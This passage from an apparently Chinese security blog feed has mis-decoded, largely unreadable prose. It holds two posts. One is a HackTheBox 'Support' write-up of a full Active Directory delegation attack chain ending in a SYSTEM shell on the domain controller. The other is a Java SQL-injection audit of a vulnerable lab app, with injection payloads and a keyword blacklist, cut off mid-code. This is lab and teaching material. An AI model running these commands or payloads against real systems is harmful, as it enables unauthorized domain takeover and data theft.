æŸ¥çœ‹æ‰€å±ç”¨æˆ·ç»„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /groups<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/f48da92422fba439.png" alt="image-20250419035926121" style="zoom: 40%;" /><h2 id="ä¸Šä¼ -SharpHound-æšä¸¾-AD-ä¿¡æ¯"><a href="#ä¸Šä¼ -SharpHound-æšä¸¾-AD-ä¿¡æ¯" class="headerlink" title="ä¸Šä¼  SharpHound æšä¸¾ AD ä¿¡æ¯"></a>ä¸Šä¼  SharpHound æšä¸¾ AD ä¿¡æ¯</h2><p>å¼€æ”¾äº† 88 ç«¯å£ï¼Œä¸Šä¼  SharpHound è¿›è¡ŒåŸŸå†…çš„ä¿¡æ¯æ”¶é›†</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\SharpHound.exe <span class="hljs-literal">--CollectionMethods</span> All <span class="hljs-literal">--Domain</span> support.htb <span class="hljs-literal">--ExcludeDCs</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/13259487ac5d6922.png" alt="image-20250420221631033" style="zoom: 40%;" /><p>å°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°</p><img src="https://img.dkdun.cn/v1/2025/12/6fdccbe631e4289a.png" alt="image-20250420222112263" style="zoom: 50%;" /><h2 id="å¼€å¯-Neo4j-å›¾å½¢æ•°æ®åº“"><a href="#å¼€å¯-Neo4j-å›¾å½¢æ•°æ®åº“" class="headerlink" title="å¼€å¯ Neo4j å›¾å½¢æ•°æ®åº“"></a>å¼€å¯ Neo4j å›¾å½¢æ•°æ®åº“</h2><img src="https://img.dkdun.cn/v1/2025/12/539c7ddf3af6d7a4.png" alt="image-20250420232256130" style="zoom: 45%;" /><p>å¼€å¯ Neo4j ç„¶åè®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:7474/browser<br></code></pre></td></tr></table></figure><p>è¿›å»ä¹‹åä¿®æ”¹å¯†ç </p><h2 id="BloodHound-æŸ¥çœ‹åŸŸå†…å…³ç³»"><a href="#BloodHound-æŸ¥çœ‹åŸŸå†…å…³ç³»" class="headerlink" title="BloodHound æŸ¥çœ‹åŸŸå†…å…³ç³»"></a>BloodHound æŸ¥çœ‹åŸŸå†…å…³ç³»</h2><p>æ‰“å¼€ <code>BloodHound</code> ç”¨ Neo4j çš„ç”¨æˆ·åå’Œå¯†ç ç™»é™†è¿›å»</p><img src="https://img.dkdun.cn/v1/2025/12/ee4e6da286eb02f6.png" alt="image-20250420232046478" style="zoom:50%;" /><p>å°†ä¸‹è½½çš„æœ‰å…³ AD åŸŸä¿¡æ¯çš„å‹ç¼©åŒ…å¯¼å…¥ï¼Œç›´æ¥æ‹–è¿›å»å°±è¡Œäº†</p><img src="https://img.dkdun.cn/v1/2025/12/e1d8f9e4a87c73dc.png" alt="image-20250420232512337" style="zoom: 35%;" /><p>æŸ¥æ‰¾ <code>SUPPORT@SUPPORT.HTB</code> ç”¨æˆ·ï¼Œåœ¨ <code>Node Info</code> çš„ <code>Group Delegated Object Control</code> ä¸­å‘ç° <code>GenericAll</code> æƒé™ä¹Ÿå°±æ˜¯å®Œå…¨æ§åˆ¶æƒé™ï¼Œå¯ä»¥å‘ç° <code>SUPPORT@SUPPORT.HTB</code> å±äº <code>SHARED SUPPORT ACCOUNTS</code> ç»„ï¼Œè¯¥ç»„å¯¹æ•´ä¸ª DC æœ‰å®Œå…¨æ§åˆ¶æƒé™</p><img src="https://img.dkdun.cn/v1/2025/12/a0271ede03b1ed09.png" alt="image-20250420234318895" style="zoom: 40%;" /><p>å³é”® <code>GenericAll</code> æŸ¥çœ‹ help çš„å»ºè®®</p><img src="https://img.dkdun.cn/v1/2025/12/0bb2f18b5086ff3c.png" alt="image-20250420235056409" style="zoom: 67%;" /><p>â€œFull control of a computer object can be used to perform a resource based constrained delegation attack.â€</p><p>å¯¹è®¡ç®—æœºå¯¹è±¡çš„å®Œå…¨æ§åˆ¶å¯ç”¨äºæ‰§è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»</p><img src="https://img.dkdun.cn/v1/2025/12/4b173c5e9ea0761a.png" alt="image-20250420235357614" style="zoom:67%;" /><h1 id="åŸºäº-kerberos-çš„-RBCD-æ”»å‡»"><a href="#åŸºäº-kerberos-çš„-RBCD-æ”»å‡»" class="headerlink" title="åŸºäº kerberos çš„ RBCD æ”»å‡»"></a>åŸºäº kerberos çš„ RBCD æ”»å‡»</h1><p>RBCD æŠŠè®¾ç½®å§”æ´¾çš„æƒé™èµ‹äºˆäº†æœºå™¨è‡ªèº«ï¼Œå³æœºå™¨è‡ªå·±å¯ä»¥å†³å®šè°å¯ä»¥è¢«å§”æ´¾æ¥æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æœºå™¨è‡ªèº«å¯ä»¥ç›´æ¥åœ¨è‡ªå·±è´¦æˆ·ä¸Šé…ç½® <code>msds-allowedtoactonbehalfofotheridentity</code> å±æ€§æ¥è®¾ç½® RBCDï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ Powermad æ¥æ·»åŠ æ–°çš„æ”»å‡»è€…æ§åˆ¶çš„è®¡ç®—æœºå¸æˆ·</p><p>æ”»å‡»æ­¥éª¤ï¼š</p><ul><li><p>ç”¨ Powermad æ·»åŠ ä¸€ä¸ªæ–°çš„æ”»å‡»è€…æ§åˆ¶çš„è®¡ç®—æœºè´¦æˆ·</p></li><li><p>ç”¨ PowerView æ¥è·å–æ–°åˆ›å»ºçš„è®¡ç®—æœºå¸æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦ (SID)</p></li><li><p>ä»¥æ–°å»ºçš„è®¡ç®—æœºè´¦æˆ·çš„ SID ä¸ºå§”æ‰˜å»ºç«‹ä¸€ä¸ªé€šç”¨ ACEï¼Œå¹¶è·å–æ–° DACL&#x2F;ACE</p></li><li><p>å°† ACE è®¾ç½®åˆ°ç›®æ ‡è®¡ç®—æœºè´¦æˆ·çš„å§”æ´¾å±æ€§ä¸­ï¼Œå°† <code>$SDBytes</code> å†™å…¥ç›®æ ‡è®¡ç®—æœºè´¦æˆ·çš„ <code>msds-allowedtoactonbehalfofotheridentity</code> å­—æ®µä¸­</p></li><li><p>ä½¿ç”¨ Rubeus ç”Ÿæˆ hash è·å– TGTç¥¨æ®</p></li><li><p>ç”¨å¸¦æœ‰ Kerberos èº«ä»½éªŒè¯çš„ psexec è·å– SYSTEM shell</p></li></ul><p>æ ¹æ®å»ºè®®ä¿¡æ¯éœ€è¦ PowerViewã€Powermad å’Œ Rubeus ä¸‰ä¸ªå·¥å…·ï¼ŒæŠŠè¿™å‡ ä¸ªå·¥å…·ä¼ ä¸Šå»</p><img src="https://img.dkdun.cn/v1/2025/12/21a57bb5f33cfef2.png" alt="image-20250421003832988" style="zoom: 80%;" /><h2 id="åˆ©ç”¨-Powermad-åˆ›å»ºæ–°ç”¨æˆ·"><a href="#åˆ©ç”¨-Powermad-åˆ›å»ºæ–°ç”¨æˆ·" class="headerlink" title="åˆ©ç”¨ Powermad åˆ›å»ºæ–°ç”¨æˆ·"></a>åˆ©ç”¨ Powermad åˆ›å»ºæ–°ç”¨æˆ·</h2><p>å¯¼å…¥ <code>powermad.ps1</code> æ¨¡å—ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª <code>butt3rf1y</code> ç”¨æˆ·ï¼Œå¯†ç ä¸º <code>123456</code>ï¼Œæ·»åŠ ä¹‹åå†è¿›è¡ŒéªŒè¯</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">import-module</span> .\powermad.ps1<br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> butt3rf1y <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-identity</span> butt3rf1y<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1e9e0edd1ffbaeb8.png" alt="image-20250421004439909" style="zoom: 40%;" /><h2 id="å†™å…¥-msds-allowedtoactonbehalfofotheridentity-å­—æ®µ"><a href="#å†™å…¥-msds-allowedtoactonbehalfofotheridentity-å­—æ®µ" class="headerlink" title="å†™å…¥ msds-allowedtoactonbehalfofotheridentity å­—æ®µ"></a>å†™å…¥ msds-allowedtoactonbehalfofotheridentity å­—æ®µ</h2><p>å¯¼å…¥ <code>powerview.ps1</code> æ¨¡å—</p><p>è·å–æ–°å»ºè®¡ç®—æœºè´¦æˆ·çš„ SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$ComputerSid</span> = <span class="hljs-built_in">Get-DomainComputer</span> butt3rf1y <span class="hljs-literal">-Properties</span> objectsid | <span class="hljs-built_in">Select</span> <span class="hljs-literal">-Expand</span> objectsid<br></code></pre></td></tr></table></figure><p>åˆ›å»º SDï¼Œæ­£ç¡®çš„ SDDLï¼ˆSecurity Descriptor Definition Languageï¼Œå®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€)ï¼‰å­—ç¬¦ä¸²åŸºæœ¬ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:&lt;OwnerSid&gt;G:&lt;GroupSid&gt;D:&lt;DACL&gt;S:&lt;SACL&gt;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ å‡ºæ¥çš„å­—ç¬¦ä¸²å¦‚ä¸‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:BAD:(A;;GA;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$ComputerSid</span>))<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆç»“æœï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="hljs-variable">$</span>(<span class="hljs-variable">$ComputerSid</span>))<br></code></pre></td></tr></table></figure><p>æƒé™è®¾ç½®å‚è€ƒï¼š<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings">SID Strings</a> å’Œ <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings">ACE Strings</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">CC | DC | LC | SW | <span class="hljs-built_in">RP</span> | WP | DT | LO | CR | SD | RC | WD | WO<br></code></pre></td></tr></table></figure><p>å°† <code>$SDBytes</code> å†™å…¥ç›®æ ‡è®¡ç®—æœºè´¦æˆ·çš„ <code>msds-allowedtoactonbehalfofotheridentity</code> å­—æ®µä¸­</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>,<span class="hljs-number">0</span>)<br>// å°† <span class="hljs-variable">$SD</span> çš„äºŒè¿›åˆ¶æ•°æ®å†™å…¥ <span class="hljs-variable">$SDBytes</span> æ•°ç»„ä¸­<br><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-variable">$TargetComputer</span> | <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125;<br>// å°† <span class="hljs-variable">$SDBytes</span> å†™å…¥ç›®æ ‡è®¡ç®—æœºè´¦æˆ·çš„ msds<span class="hljs-literal">-allowedtoactonbehalfofotheridentity</span> å­—æ®µä¸­<br><br><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-variable">$targetComputer</span> <span class="hljs-literal">-Properties</span> <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span><br>// éªŒè¯æ˜¯å¦æˆåŠŸä¿®æ”¹<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/35aeb1145bbc481e.png" alt="image-20250421212911714" style="zoom: 50%;" /><h2 id="Rubeus-è¿›è¡Œ-s4u-æ”»å‡»è·å–æœåŠ¡ç¥¨æ®"><a href="#Rubeus-è¿›è¡Œ-s4u-æ”»å‡»è·å–æœåŠ¡ç¥¨æ®" class="headerlink" title="Rubeus è¿›è¡Œ s4u æ”»å‡»è·å–æœåŠ¡ç¥¨æ®"></a>Rubeus è¿›è¡Œ s4u æ”»å‡»è·å–æœåŠ¡ç¥¨æ®</h2><p>ç”Ÿæˆ <code>rc4_hmac</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\Rubeus.exe hash /password:<span class="hljs-number">123456</span> /user:butt3rf1y<span class="hljs-variable">$</span> /domain:support.htb<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/291744efdcd58ce8.png" alt="image-20250421220505217" style="zoom: 70%;" /><p>å– <code>rc4_hmac</code> å€¼</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">32</span>ED87BDB5FDC5E9CBA885<span class="hljs-number">47376818D4</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆ TGT ç¥¨æ®</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\Rubeus.exe s4u /user:butt3rf1y<span class="hljs-variable">$</span> /rc4:<span class="hljs-number">32</span>ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/3f4b23cc12fff0f3.png" alt="image-20250421232725353" style="zoom: 80%;" /><h2 id="åˆ©ç”¨-psexec-è·å–-system-shell"><a href="#åˆ©ç”¨-psexec-è·å–-system-shell" class="headerlink" title="åˆ©ç”¨ psexec è·å– system shell"></a>åˆ©ç”¨ psexec è·å– system shell</h2><p>å°†æœ€åçš„ <code>administrator</code> çš„å¤åˆ¶å‡ºæ¥æ–°å»ºæ–‡ä»¶ <code>TGT.b64</code>ï¼Œå…ˆè½¬ä¸º <code>.kirbi</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;[:space:]&#x27;</span> &lt; TGT.b64 | <span class="hljs-built_in">base64</span> -d &gt; TGT.kirbi<br></code></pre></td></tr></table></figure><p>å†è½¬ä¸º <code>.ccache</code> æ–‡ä»¶ï¼ˆKerberos å‡­æ®ç¼“å­˜æ–‡ä»¶ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ticketConverter.py TGT.kirbi TGT.ccache<br></code></pre></td></tr></table></figure><p>æ›´æ–° <code>KRB5CCNAME</code> ç¯å¢ƒå˜é‡ï¼ŒæŒ‡å®š Kerberos ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=TGT.ccache<br></code></pre></td></tr></table></figure><p>ç”¨å¸¦æœ‰ Kerberos èº«ä»½éªŒè¯çš„ psexec è·å– SYSTEM shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-psexec support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174 -k -no-pass<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1fca07554820f917.png" alt="image-20250421233723004" style="zoom:70%;" />]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello-Java-Sec:SQLI</title>
    <link href="/2025/04/18/Hello-Java-Sec-SQLI/"/>
    <url>/2025/04/18/Hello-Java-Sec-SQLI/</url>
    
    <content type="html"><![CDATA[<p>ä»é›¶å¼€å§‹çš„ Java ä»£ç å®¡è®¡ï¼Œé¡¹ç›®åœ°å€ï¼šHello-Java-Secï¼š<a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a></p><span id="more"></span><h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><h2 id="Statement-æ³¨å…¥"><a href="#Statement-æ³¨å…¥" class="headerlink" title="Statement æ³¨å…¥"></a>Statement æ³¨å…¥</h2><p><code>Statement</code> ä¸»è¦ç”¨äºæ‰§è¡Œæ™®é€šçš„ SQLè¯­å¥</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">vul1</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br><br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br><br>            log.info(<span class="hljs-string">&quot;[vul] æ‰§è¡ŒSQLè¯­å¥ï¼š &#123;&#125;&quot;</span>, sql);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>            <br>            ...<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª <code>StringBuilder</code> å¯¹è±¡ <code>result</code>ï¼Œæ„é€ äº†ä¸€ä¸ª sql æŸ¥è¯¢è¯­å¥ï¼ŒåŠ è½½ JDBC é©±åŠ¨ï¼Œåˆ›å»ºäº† <code>Statement</code> å¯¹è±¡æ‰§è¡Œäº† SQL è¯­å¥</p><p>ä½†æ˜¯ SQL è¯­å¥ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°è¯­å¥ä¸­å¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ä¹‹ç±»çš„æ“ä½œï¼Œå¯¼è‡´äº†æ³¨å…¥äº§ç”Ÿ</p><p><img src="https://img.dkdun.cn/v1/2025/12/3ac9cfbd75c608be.png"></p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--%20+</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9591581fa6930381.png"></p><p>sql è¯­å¥å˜æˆäº†è¿™æ ·ï¼Œä¸å‰é¢çš„å•å¼•å·ç›´æ¥é—­åˆäº†å½¢æˆä¸€ä¸ªå®Œæ•´çš„æŸ¥è¯¢è¯­å¥å»ä¿®æ”¹ XML æ•°æ®ï¼Œåˆ©ç”¨æŠ¥é”™å°†å½“å‰æ•°æ®åº“ç”¨æˆ·é€šè¿‡æ‹¼æ¥å­—ç¬¦ä¸²æ˜¾ç¤ºå‡ºæ¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--%20+ &#x27;</span><br></code></pre></td></tr></table></figure><h3 id="é»‘åå•-å¤§å°å†™å¼ºåˆ¶è½¬æ¢è¿‡æ»¤"><a href="#é»‘åå•-å¤§å°å†™å¼ºåˆ¶è½¬æ¢è¿‡æ»¤" class="headerlink" title="é»‘åå•+å¤§å°å†™å¼ºåˆ¶è½¬æ¢è¿‡æ»¤"></a>é»‘åå•+å¤§å°å†™å¼ºåˆ¶è½¬æ¢è¿‡æ»¤</h3><p>é€šè¿‡é»‘åå•è¿‡æ»¤æ¥é¢„é˜²æ³¨å…¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkSql</span><span class="hljs-params">(String content)</span> &#123;<br>    String[] black_list = &#123;<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;--&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;and&quot;</span>, <span class="hljs-string">&quot;or&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;insert&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;delete&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;count&quot;</span>, <span class="hljs-string">&quot;drop&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;mid&quot;</span>, <span class="hljs-string">&quot;master&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;char&quot;</span>, <span class="hljs-string">&quot;declare&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>&#125;;<br>    <span class="hljs-keyword">for</span> (String s : black_list) &#123;<br>        <span class="hljs-keyword">if</span> (content.toLowerCase().contains(s)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PrepareStatement"><a href="#PrepareStatement" class="headerlink" title="PrepareStatement"></a>PrepareStatement</h2><h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">vul2</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where id = &quot;</span> + id;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br><br>            log.info(<span class="hljs-string">&quot;[vul] æ‰§è¡ŒSQLè¯­å¥ï¼š &#123;&#125;&quot;</span>, sql);<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> st.executeQuery();<br>            ...<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶é‡‡ç”¨äº† <code>prepareStatement</code> æ–¹æ³•è¿›è¡Œäº†é¢„ç¼–è¯‘ï¼Œä½†å¹¶æ²¡æœ‰ä½¿ç”¨ <code>?</code> è¿›è¡Œå ä½ï¼Œæ‰€ä»¥æœ¬è´¨ä¸Šè¿˜æ˜¯ sql è¿›è¡Œäº†è¯­å¥æ‹¼æ¥ï¼Œäº§ç”Ÿäº† sql æ³¨å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/2074b96e7dde0a4a.png"></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2077a05b14921065.png"></p><p>sql è¯­å¥å˜æˆäº†è¿™æ ·ï¼Œç›´æ¥æŸ¥è¯¢ id &#x3D;2 çš„ç»“æœ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-å ä½"><a href="#ä½¿ç”¨-å ä½" class="headerlink" title="ä½¿ç”¨ ? å ä½"></a>ä½¿ç”¨ ? å ä½</h3><p>ç”¨ <code>?</code> å ä½å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safe1</span><span class="hljs-params">(String id)</span> &#123;<br>    Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(db_url, db_user, db_pass);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users 